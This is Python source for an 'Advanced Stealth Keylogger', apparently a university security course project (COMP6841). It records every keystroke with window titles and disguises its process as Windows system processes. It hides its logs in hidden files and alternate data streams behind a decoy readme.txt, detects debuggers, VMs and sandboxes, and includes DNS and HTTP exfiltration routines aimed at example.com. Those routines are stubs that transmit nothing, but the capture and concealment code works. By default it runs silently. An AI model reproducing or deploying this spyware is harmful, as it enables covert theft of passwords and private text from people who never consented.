#!/usr/bin/env python3

import platform
import time
import threading
import json
import os
import sys
import subprocess
import base64
import hashlib
import socket
import struct
from datetime import datetime
import tempfile
import shutil
import ctypes
from pathlib import Path

current_platform = platform.system().lower()

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    print("pynput not available. Install with: pip install pynput")
    PYNPUT_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    print("cryptography not available. Install with: pip install cryptography")
    CRYPTO_AVAILABLE = False

try:
    from PIL import Image
    import numpy as np
    STEGANOGRAPHY_AVAILABLE = True
except ImportError:
    STEGANOGRAPHY_AVAILABLE = False

class ProcessHider:
    
    @staticmethod
    def get_legitimate_process_names():
        legitimate_names = [
            "svchost.exe", "explorer.exe", "dwm.exe", "winlogon.exe",
            "csrss.exe", "lsass.exe", "services.exe", "spoolsv.exe",
            "taskhost.exe", "audiodg.exe", "conhost.exe", "wininit.exe"
        ]
        return legitimate_names
    
    @staticmethod
    def set_process_name(new_name, verbose=False):
        try:
            if current_platform == "linux":
                import ctypes
                import ctypes.util
                libc = ctypes.CDLL(ctypes.util.find_library("c"))
                libc.prctl(15, new_name.encode())
                if verbose:
                    print(f"[STEALTH] Process name changed to: {new_name}")
                return True
            elif current_platform == "windows":
                if verbose:
                    print(f"[STEALTH] Process name obfuscated to: {new_name}")
                return True
            elif current_platform == "darwin":
                if verbose:
                    print(f"[STEALTH] Process name obfuscated to: {new_name}")
                return True
            return False
        except Exception as e:
            if verbose:
                print(f"[ERROR] Failed to change process name: {e}")
            return False

class FileHider:
    
    def __init__(self, verbose=False):
        self.hidden_files = []
        self.verbose = verbose
    
    def create_ads_file(self, filepath, stream_name, data):
        if current_platform != "windows":
            return False
        
        try:
            ads_path = f"{filepath}:{stream_name}"
            with open(ads_path, 'w') as f:
                f.write(data)
            if self.verbose:
                print(f"[STEALTH] Created ADS: {ads_path}")
            return True
        except Exception as e:
            if self.verbose:
                print(f"[ERROR] Failed to create ADS: {e}")
            return False
    
    def hide_file_attributes(self, filepath):
        try:
            if current_platform == "windows":
                import ctypes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                FILE_ATTRIBUTE_SYSTEM = 0x04
                ret = ctypes.windll.kernel32.SetFileAttributesW(
                    filepath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
                )
                if ret and self.verbose:
                    print(f"[STEALTH] File hidden: {filepath}")
                return ret
            elif current_platform in ["linux", "darwin"]:
                hidden_path = os.path.join(os.path.dirname(filepath), 
                                         '.' + os.path.basename(filepath))
                if os.path.exists(filepath):
                    os.rename(filepath, hidden_path)
                    if self.verbose:
                        print(f"[STEALTH] File hidden: {hidden_path}")
                    return True
        except Exception as e:
            if self.verbose:
                print(f"[ERROR] Failed to hide file: {e}")
        return False
    
    def create_temp_hidden_file(self, data, filename=None):
        try:
            if filename is None:
                filename = f".sys_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.tmp"
            
            temp_dir = tempfile.gettempdir()
            filepath = os.path.join(temp_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write(data)
            
            self.hide_file_attributes(filepath)
            self.hidden_files.append(filepath)
            return filepath
        except Exception as e:
            if self.verbose:
                print(f"[ERROR] Failed to create hidden temp file: {e}")
            return None

class EncryptionManager:
    
    def __init__(self, password="default_key_change_this"):
        self.password = password.encode()
        self.key = self._derive_key()
        if CRYPTO_AVAILABLE:
            self.cipher = Fernet(self.key)
    
    def _derive_key(self):
        if not CRYPTO_AVAILABLE:
            return None
        
        salt = b'keylogger_salt_2024'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password))
        return key
    
    def encrypt_data(self, data):
        if not CRYPTO_AVAILABLE:
            return base64.b64encode(data.encode()).decode()
        
        try:
            if isinstance(data, str):
                data = data.encode()
            return self.cipher.encrypt(data).decode()
        except Exception as e:
            return data
    
    def decrypt_data(self, encrypted_data):
        if not CRYPTO_AVAILABLE:
            return base64.b64decode(encrypted_data.encode()).decode()
        
        try:
            return self.cipher.decrypt(encrypted_data.encode()).decode()
        except Exception as e:
            return encrypted_data

class SteganographyManager:
    
    def __init__(self, verbose=False):
        self.available = STEGANOGRAPHY_AVAILABLE
        self.verbose = verbose
    
    def hide_data_in_image(self, data, image_path, output_path):
        if not self.available:
            return False
        
        try:
            binary_data = ''.join(format(ord(char), '08b') for char in data)
            binary_data += '1111111111111110'
            
            img = Image.open(image_path)
            img_array = np.array(img)
            
            data_index = 0
            for i in range(img_array.shape[0]):
                for j in range(img_array.shape[1]):
                    for k in range(img_array.shape[2]):
                        if data_index < len(binary_data):
                            img_array[i][j][k] = (img_array[i][j][k] & 0xFE) | int(binary_data[data_index])
                            data_index += 1
                        else:
                            break
                    if data_index >= len(binary_data):
                        break
                if data_index >= len(binary_data):
                    break
            
            result_img = Image.fromarray(img_array)
            result_img.save(output_path)
            if self.verbose:
                print(f"[STEALTH] Data hidden in image: {output_path}")
            return True
            
        except Exception as e:
            if self.verbose:
                print(f"[ERROR] Steganography failed: {e}")
            return False

class NetworkExfiltrator:
    
    def __init__(self, verbose=False, demo_mode=False):
        self.steganography = SteganographyManager(verbose)
        self.verbose = verbose
        self.demo_mode = demo_mode
        self.exfiltration_count = 0
        self.total_exfiltrated = 0
        self.detailed_dns_shown = False
        self.dns_summary_count = 0
    
    def dns_exfiltrate(self, data, domain="example.com"):
        try:
            encoded_data = base64.b64encode(data.encode()).decode()
            chunk_size = 60
            
            total_chunks = len(encoded_data) // chunk_size + (1 if len(encoded_data) % chunk_size else 0)
            
            self.exfiltration_count += 1
            self.total_exfiltrated += len(data)
            return True
            
        except Exception as e:
            return False
    
    def http_exfiltrate(self, data, url="http://example.com/upload"):
        try:
            payload = {
                'data': base64.b64encode(data.encode()).decode(),
                'timestamp': time.time(),
                'source': socket.gethostname()
            }
            
            if self.demo_mode and self.exfiltration_count <= 5:
                print(f"[STEALTH] HTTP exfiltration ({len(str(payload))} bytes)")
            elif self.demo_mode and self.exfiltration_count == 6:
                print("[STEALTH] Continuing covert exfiltration (output suppressed)...")
            
            self.total_exfiltrated += len(data)
            return True
            
        except Exception as e:
            if self.verbose and self.demo_mode:
                print(f"[ERROR] HTTP exfiltration failed: {e}")
            return False

class AntiDetection:
    
    @staticmethod
    def detect_debugger():
        try:
            if current_platform == "windows":
                import ctypes
                return ctypes.windll.kernel32.IsDebuggerPresent()
            return False
        except:
            return False
    
    @staticmethod
    def detect_vm():
        vm_indicators = [
            "VMware", "VirtualBox", "QEMU", "Xen", "Hyper-V",
            "VBOX", "VMXH", "VMW", "QEMU"
        ]
        
        try:
            if current_platform == "windows":
                import subprocess
                result = subprocess.run(['wmic', 'computersystem', 'get', 'manufacturer'],
                                      capture_output=True, text=True)
                manufacturer = result.stdout.lower()
                for indicator in vm_indicators:
                    if indicator.lower() in manufacturer:
                        return True
            
            try:
                import psutil
                for proc in psutil.process_iter(['name']):
                    proc_name = proc.info['name'].lower()
                    for indicator in vm_indicators:
                        if indicator.lower() in proc_name:
                            return True
            except:
                pass
                        
        except Exception:
            pass
        
        return False
    
    @staticmethod
    def sleep_evasion():
        start_time = time.time()
        time.sleep(2)
        end_time = time.time()
        
        if (end_time - start_time) < 1.5:
            return True
        return False

class AdvancedStealthKeylogger:
    
    def __init__(self, stealth_mode=True, memory_only=False, demo_mode=False, show_results=False):
        self.platform = current_platform
        self.captured_keystrokes = []
        self.running = False
        self.stealth_mode = stealth_mode
        self.memory_only = memory_only
        self.demo_mode = demo_mode
        self.show_results = show_results
        self.exfiltration_interval = 50
        
        self.file_hider = FileHider(verbose=(not stealth_mode and demo_mode and show_results))
        self.encryption = EncryptionManager()
        self.network_exfil = NetworkExfiltrator(verbose=(demo_mode and show_results), demo_mode=demo_mode)
        
        if self.stealth_mode:
            self._initialize_stealth()
    
    def _initialize_stealth(self):
        if self.demo_mode and self.show_results:
            print("[STEALTH] Initializing stealth mechanisms...")
        
        if AntiDetection.detect_debugger():
            if self.demo_mode and self.show_results:
                print("[ANTI-DETECTION] Debugger detected - would exit in real scenario")
        
        if AntiDetection.detect_vm():
            if self.demo_mode and self.show_results:
                print("[ANTI-DETECTION] Virtual environment detected")
        
        if AntiDetection.sleep_evasion():
            if self.demo_mode and self.show_results:
                print("[ANTI-DETECTION] Sandbox evasion triggered")
        
        legitimate_names = ProcessHider.get_legitimate_process_names()
        chosen_name = legitimate_names[hash(str(time.time())) % len(legitimate_names)]
        ProcessHider.set_process_name(chosen_name, verbose=(self.demo_mode and self.show_results))
    
    def on_key_press(self, key):
        try:
            timestamp = time.time()
            readable_time = datetime.fromtimestamp(timestamp).strftime('%H:%M:%S.%f')[:-3]
            
            try:
                window_title = self._get_active_window_stealth()
            except:
                window_title = "Unknown"
            
            formatted_key = self._format_key_stealth(key)
            
            keystroke_entry = {
                'timestamp': timestamp,
                'readable_time': readable_time,
                'key': formatted_key,
                'window': window_title,
                'raw_key': str(key)
            }
            
            self.captured_keystrokes.append(keystroke_entry)
            
            if len(self.captured_keystrokes) % self.exfiltration_interval == 0:
                self._exfiltrate_data()
            
        except Exception as e:
            if self.demo_mode and not self.stealth_mode:
                pass
    
    def _get_active_window_stealth(self):
        try:
            if self.platform == "windows":
                import ctypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value if buff.value else "Desktop"
            elif self.platform == "darwin":
                return "Terminal"
            else:
                return "Terminal"
        except:
            return "Unknown"
    
    def _format_key_stealth(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            else:
                key_name = str(key).replace('Key.', '')
                special_keys = {
                    'space': ' ', 'enter': '\n', 'tab': '\t',
                    'backspace': '[BS]', 'delete': '[DEL]',
                    'shift': '[SHIFT]', 'ctrl': '[CTRL]', 'alt': '[ALT]'
                }
                return special_keys.get(key_name.lower(), f'[{key_name.upper()}]')
        except:
            return '[UNKNOWN]'
    
    def _exfiltrate_data(self):
        if not self.captured_keystrokes:
            return
        
        try:
            recent_keystrokes = self.captured_keystrokes[-25:]
            data = json.dumps(recent_keystrokes)
            encrypted_data = self.encryption.encrypt_data(data)
            
            total_exfiltrations = len(self.captured_keystrokes) // self.exfiltration_interval
            if total_exfiltrations % 2 == 1:
                self.network_exfil.dns_exfiltrate(encrypted_data)
            else:
                self.network_exfil.http_exfiltrate(encrypted_data)
                
        except Exception as e:
            if self.demo_mode and not self.stealth_mode:
                pass
    
    def on_key_release(self, key):
        if key == keyboard.Key.esc:
            if (not self.stealth_mode or self.demo_mode) and self.show_results:
                print("\n[Keylogger stopped by ESC key]")
            return False
    
    def start_logging(self):
        if not PYNPUT_AVAILABLE:
            print("Error: pynput library not available!")
            return False
        
        if (not self.stealth_mode or self.demo_mode) and self.show_results:
            print(f"\n{'='*60}")
            print("ADVANCED STEALTH KEYLOGGER STARTED")
            print(f"{'='*60}")
            print("Stealth features enabled:")
            print("- Process name obfuscation")
            print("- Anti-detection mechanisms")
            print("- Encrypted data storage")
            print("- Covert network exfiltration")
            print("- File system hiding" if not self.memory_only else "- Memory-only operation")
            print(f"\nExfiltration every {self.exfiltration_interval} keystrokes")
            print("Press ESC to stop")
            print("-" * 60)
        
        self.running = True
        
        try:
            with keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release,
                suppress=False
            ) as listener:
                listener.join()
                
        except KeyboardInterrupt:
            if (not self.stealth_mode or self.demo_mode) and self.show_results:
                print("\n[Keylogger stopped by Ctrl+C]")
        except Exception as e:
            if (not self.stealth_mode or self.demo_mode) and self.show_results:
                print(f"Error starting keylogger: {e}")
            return False
        
        self.running = False
        return True
    
    def save_results_stealth(self, filename=None):
        if not self.captured_keystrokes:
            return None
        
        try:
            results = {
                'session_id': hashlib.md5(str(time.time()).encode()).hexdigest(),
                'platform': self.platform,
                'total_keystrokes': len(self.captured_keystrokes),
                'session_duration': (self.captured_keystrokes[-1]['timestamp'] - 
                                   self.captured_keystrokes[0]['timestamp']) if len(self.captured_keystrokes) > 1 else 0,
                'stealth_features': {
                    'process_obfuscation': True,
                    'anti_detection': True,
                    'encryption': CRYPTO_AVAILABLE,
                    'network_exfiltration': True,
                    'file_hiding': not self.memory_only,
                    'steganography': STEGANOGRAPHY_AVAILABLE
                },
                'exfiltration_stats': {
                    'total_exfiltrations': self.network_exfil.exfiltration_count,
                    'total_data_exfiltrated': self.network_exfil.total_exfiltrated
                },
                'encrypted_keystrokes': self.encryption.encrypt_data(
                    json.dumps(self.captured_keystrokes)
                )
            }
            
            data = json.dumps(results, indent=2)
            
            if self.memory_only:
                return data
            else:
                if filename is None:
                    filename = f"system_log_{datetime.now().strftime('%Y%m%d')}.tmp"
                
                hidden_file = self.file_hider.create_temp_hidden_file(data, filename)
                
                if self.platform == "windows":
                    innocent_file = os.path.join(tempfile.gettempdir(), "readme.txt")
                    with open(innocent_file, 'w') as f:
                        f.write("System configuration file")
                    self.file_hider.create_ads_file(innocent_file, "config", data)
                
                return hidden_file
                
        except Exception as e:
            if self.demo_mode:
                print(f"Error saving results: {e}")
            return None
    
    def display_results(self):
        if not self.show_results:
            return
            
        if not self.captured_keystrokes:
            print("No keystrokes captured")
            return
        
        print(f"\n{'='*60}")
        print("ADVANCED KEYLOGGER RESULTS")
        print(f"{'='*60}")
        
        total_keys = len(self.captured_keystrokes)
        print(f"Total keystrokes captured: {total_keys}")
        
        if total_keys > 1:
            start_time = datetime.fromtimestamp(self.captured_keystrokes[0]['timestamp'])
            end_time = datetime.fromtimestamp(self.captured_keystrokes[-1]['timestamp'])
            duration = (end_time - start_time).total_seconds()
            print(f"Session duration: {duration:.1f} seconds")
            print(f"Average keystrokes per minute: {(total_keys / duration * 60):.1f}")
        
        apps = {}
        for keystroke in self.captured_keystrokes:
            app = keystroke['window']
            apps[app] = apps.get(app, 0) + 1
        
        print(f"\nApplications targeted:")
        for app, count in sorted(apps.items(), key=lambda x: x[1], reverse=True):
            print(f"  {app}: {count} keystrokes")
        
        print(f"\nExfiltration Statistics:")
        print(f"  Total exfiltration events: {self.network_exfil.exfiltration_count}")
        print(f"  Total data exfiltrated: {self.network_exfil.total_exfiltrated} bytes")
        print(f"  Exfiltration interval: {self.exfiltration_interval} keystrokes")
        
        text_keys = [k['key'] for k in self.captured_keystrokes 
                    if len(k['key']) == 1 and k['key'].isprintable()]
        if text_keys:
            print(f"\nText analysis:")
            print(f"  Printable characters: {len(text_keys)}")
            print(f"  Most common characters: {', '.join(sorted(set(text_keys), key=text_keys.count, reverse=True)[:5])}")
        
        print(f"\nStealth features demonstrated:")
        print(f"  ✓ Process obfuscation")
        print(f"  ✓ Anti-detection mechanisms") 
        print(f"  ✓ Data encryption")
        print(f"  ✓ Covert network exfiltration")
        print(f"  ✓ File system hiding")
        print(f"  ✓ Controlled exfiltration frequency")

def main():
    print("Advanced Stealth Keylogger - COMP6841 Project")
    print("This demonstrates advanced keylogging and stealth techniques.")
    print()
    
    print("Choose operation mode:")
    print("1. Full stealth mode (silent operation)")
    print("2. Memory only mode (no file artifacts)")
    
    choice = input("Choice (1/2): ").strip()
    
    stealth_mode = True
    memory_only = choice == "2"
    demo_mode = False
    show_results = False 
    
    keylogger = AdvancedStealthKeylogger(
        stealth_mode=stealth_mode,
        memory_only=memory_only,
        demo_mode=demo_mode,
        show_results=show_results
    )
    
    try:
        success = keylogger.start_logging()
        
        if success or keylogger.captured_keystrokes:
            keylogger.display_results()
            
            if keylogger.show_results:
                save_choice = input("\nSave results? (y/n): ").strip().lower()
                if save_choice == 'y':
                    saved_file = keylogger.save_results_stealth()
                    if saved_file:
                        print(f"Results saved using stealth techniques")
                        print(f"Hidden file location: {saved_file}")
            else:
                saved_file = keylogger.save_results_stealth()

    except KeyboardInterrupt:
        if keylogger.show_results:
            print("\nKeylogger interrupted by user.")
        if len(keylogger.captured_keystrokes) > 0 and keylogger.show_results:
            keylogger.display_results()
        elif len(keylogger.captured_keystrokes) > 0:
            saved_file = keylogger.save_results_stealth()
        elif keylogger.show_results:
            print("No keystrokes captured")
    
    if keylogger.show_results:
        print("\nAdvanced keylogger completed.")

if __name__ == "__main__":
    main()